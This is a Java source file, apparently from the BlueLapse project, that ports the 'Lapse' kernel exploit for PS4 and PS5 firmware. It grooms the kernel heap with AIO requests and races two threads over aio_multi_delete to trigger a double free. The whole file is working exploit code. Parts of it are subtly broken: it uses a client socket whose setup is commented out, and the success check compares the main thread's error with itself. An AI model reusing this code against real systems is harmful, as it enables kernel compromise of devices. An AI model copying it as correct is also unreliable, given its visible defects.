// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.payload;

import java.util.Random;

import org.bdj.UITextConsole;
import org.bdj.api.Buffer;
import org.bdj.payload.LibKernel.AioErrorArray;
import org.bdj.payload.LibKernel.AioRWRequest;
import org.bdj.payload.LibKernel.AioRWRequestArray;
import org.bdj.payload.LibKernel.AioSubmitIdArray;
import org.bdj.payload.LibKernel.SocketAddress;
import org.bdj.payload.LibKernel.FileDescriptor;
import org.bdj.payload.LibKernel.Socket;
import org.bdj.payload.LibKernel.ThreadPriority;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

/* Primary thread that Lapse runs on.
 * It's separate from the RemoteLoader/Payload thread to hopefully be more robust. */

public class LapseMainThread extends Thread {
	public final LibKernel k;
	public final UITextConsole console;

	// Constants from lapse.lua
	public static final int MAIN_CORE = 4;
	public static final int MAIN_RTPRIO = 0x100;
	public static final int NUM_WORKERS = 2;
	public static final int NUM_GROOMS = 0x200;
	public static final int NUM_GROOM_REQS = 3;
	public static final int NUM_HANDLES = 0x100;
	// Should be called NUM_ATTEMPTS really
	public static final int NUM_RACES = 100;
	public static final int NUM_RACE_REQS = 3;
	public static final int NUM_SDS = 64;
	public static final int NUM_SDS_ALT = 48;
	public static final int NUM_ALIAS = 100;
	public static final int LEAK_LEN = 16;
	public static final int NUM_LEAKS = 16;
	public static final int NUM_CLOBBERS = 8;

	public LapseMainThread(LibKernel libkernel, UITextConsole console) {
		k = libkernel;
		this.console = console;
	}

	public void run() {
		try {
			boolean successful = false;
			setup();
			for (int i = 0; i < NUM_RACES; i++) {
				successful = loop(i);
				cleanAfterLoop();
				if (successful) break;
			}
			if (!successful) {
				console.add("Lapse: exploit failed");
			}
		} catch (Throwable e) {
			console.add(e);
		} finally {
			try {
				cleanAfterLoop();
			} catch (Throwable e) {
				console.add(e);
			}
			try {
				cleanAfterSetup();
			} catch (Throwable e) {
				console.add(e);
			}
		}
	}

	// CPU affinity and priority to restore after exploit
	public int oldAffinity, newAffinity;
	public ThreadPriority oldPriority, newPriority;

	// Socket pair for the "block AIO worker threads from processing entries" step
	Socket[] blockFds = null;

	// Socket "to wait for soclose"
	Socket serverSocket = null;
	SocketAddress serverAddress;

	// Main and race thread will be racing to delete one particular request in this array
	AioRWRequestArray raceRequests = null;
	AioSubmitIdArray raceSubmitIds = null;

	private void setup() {
		// Pin to 1 core so that we only use 1 per-cpu bucket. This will make heap spraying and
		// grooming easier. Also set priority to realtime.
		// FIXME: Priority might be causing the system freezes? Let's not use realtime for now

		console.add("Lapse: change thread priorities");

		oldAffinity = k.cpuGetAffinityForCurrentThread();
		oldPriority = k.cpuGetPriorityForCurrentThread();

		console.add("-> old: affinity 0x" + Integer.toHexString(oldAffinity) + ", priority " + oldPriority.toString());

		newAffinity = 1 << MAIN_CORE;
		k.cpuSetAffinityForCurrentThread(newAffinity);
		newAffinity = k.cpuGetAffinityForCurrentThread();

		// FIXME: There's some kind of issue with the priorities
		// I'm seeing numbers like {10,715} for initial priority from rtprio_thread RTP_LOOKUP
		// which should not be possible based on the FreeBSD headers? RTP_SET also complains about
		// {3,0}. I half suspect this priority nonsense is what's causing freezes.
		newPriority = oldPriority;
		// ThreadPriority newPriority = new ThreadPriority(LibKernel.PRI_TIMESHARE, (short)0);
		// k.cpuSetPriorityForCurrentThread(newPriority);

		console.add("-> new: affinity 0x" + Integer.toHexString(newAffinity) + ", priority " + newPriority.toString());

		// This part will block the worker threads from processing entries so that we may cancel
		// them instead. This is to work around the fact that aio_worker_entry2() will fdrop() the
		// file associated with the aio_entry on ps5. We want aio_multi_delete() to call fdrop().
		// FIXME: Is this relevant on PS4? The comment above suggests it isn't?

		console.add("Lapse: block AIO worker threads from processing entries");

		blockFds = k.socketPair(LibKernel.AF_UNIX, LibKernel.SOCK_STREAM);

		AioRWRequestArray blockReqs = k.new AioRWRequestArray(NUM_WORKERS);
		for (int i = 0; i < blockReqs.count; i++) {
			blockReqs.set(i, 0, 1, null, null, blockFds[0].fd);
		}

		AioSubmitIdArray blockIds = k.new AioSubmitIdArray(NUM_WORKERS);
		k.aioSubmitCmd(LibKernel.AIO_CMD_READ, blockReqs, blockIds);

		// Lapse calls this spray_aio
		// Allocate enough so that we start allocating from a newly created slab

		console.add("Lapse: heap grooming: make & cancel " + NUM_GROOMS + " * " + NUM_GROOM_REQS + " aio reads");

		AioRWRequestArray groomReqs = k.new AioRWRequestArray(NUM_GROOM_REQS);
		AioSubmitIdArray groomIds = k.new AioSubmitIdArray(NUM_GROOMS * NUM_GROOM_REQS);
		for (int i = 0; i < NUM_GROOMS; i++) {
			k.aioSubmitCmd(LibKernel.AIO_CMD_READ, groomReqs, groomIds.slice(i, NUM_GROOM_REQS));
		}

		k.aioMultiCancelAutoBatch(groomIds, null);

		// console.add("Lapse: setup inet socket to wait for soclose");

		// // Pick a random port in case it's a bad idea if it gets accidentally reused
		// Random random = new Random();
		// int port = 10000 + (random.nextInt() % 20000);
		// serverAddress = k.new SocketAddress(LibKernel.AF_INET, port, 127, 0, 0, 1);

		// serverSocket = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
		// serverSocket.setReuseAddr(true);
		// serverSocket.bind(serverAddress);
		// serverSocket.listen(1);

		console.add("Lapse: allocate aio requests array");

		raceRequests = k.new AioRWRequestArray(NUM_RACE_REQS);
		raceSubmitIds = k.new AioSubmitIdArray(NUM_RACE_REQS);
	}

	Socket client = null;
	Socket connection = null;

	private boolean loop(int attempt) {
		console.add("Lapse: attempt " + attempt + " of " + NUM_RACES);

		// // Some sockets nonsense that I don't understand yet
		// // Wait, is this just required because Lua doesn't support threads?
		// client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
		// client.connect(serverAddress);
		// connection = serverSocket.accept();

		// // Force soclose() to sleep
		// connection.setLinger(true, 1);

		// Set up the request that the main and race thread will be racing over
		int whichRequest = NUM_RACE_REQS - 1;
		raceRequests.set(whichRequest, 0, 0, null, null, client.fd);

		console.add("Lapse: initial submit/cancel/poll");

		// FIXME: What does this accomplish again?
		k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, raceRequests, raceSubmitIds);
		k.aioMultiCancel(raceSubmitIds, null);
		k.aioMultiPoll(raceSubmitIds, null);

		// Drop the reference so that aio_multi_delete will trigger _fdrop
		client.close();

		// We'll be trying to double-delete whichRequest from the main and race threads
		AioSubmitIdArray submitIdsToDelete = raceSubmitIds.slice(whichRequest, 1);
		AioErrorArray mainThreadErrors = k.new AioErrorArray(1);
		AioErrorArray raceThreadErrors = k.new AioErrorArray(1);

		// Set up the worker thread
		Buffer racerTidBuf  = new Buffer(8); racerTidBuf.fill((byte)0);
		Buffer racerDoneBuf = new Buffer(8); racerDoneBuf.fill((byte)0);
		FileDescriptor[] racerPipe = k.pipe();
		LapseRaceThread racer = new LapseRaceThread(this, racerTidBuf, racerDoneBuf, racerPipe[0],
			submitIdsToDelete, raceThreadErrors);

		console.add("Lapse: starting racer thread");
		racer.start();
		if (!k.waitUntilNotEqualLong(racerTidBuf, 0, 0, 1, 2000)) {
			throw new RuntimeException("Timed out waiting on racerTidBuf");
		}

		long racerTid = racerTidBuf.getLong(0);
		console.add("Lapse: racer thread has id " + racerTid);
		console.add("Lapse: starting race to delete aio submit " + raceSubmitIds.get(0).id.get());

		// Resume worker thread
		racerPipe[1].write(new Buffer(1));

		// Delete (hopefully double-free!)
		k.aioMultiDelete(submitIdsToDelete, mainThreadErrors);

		// Wait for the worker thread to finish as well
		if (!k.waitUntilNotEqualLong(racerDoneBuf, 0, 0, 1, 2000)) {
			throw new RuntimeException("Timed out waiting on racerDoneBuf");
		}

		int mainError = mainThreadErrors.get(0).id.get();
		int raceError = mainThreadErrors.get(0).id.get();
		console.add("Lapse: main/race errors: 0x" + Integer.toHexString(mainError) + " 0x" + Integer.toHexString(raceError));
		if (mainError == raceError) {
			console.add("Lapse: double free achieved!");
			return true;
		}

		return false; // did not win the race
	}

	private void cleanAfterLoop() {
		if (client != null) {
			client.close();
		}
		if (connection != null) {
			connection.close();
		}
	}

	private void cleanAfterSetup() {
		k.cpuSetAffinityForCurrentThread(oldAffinity);
		k.cpuSetPriorityForCurrentThread(oldPriority);
		if (blockFds != null) {
			blockFds[0].close();
			blockFds[1].close();
		}
		if (serverSocket != null) {
			serverSocket.close();
		}
	}
}
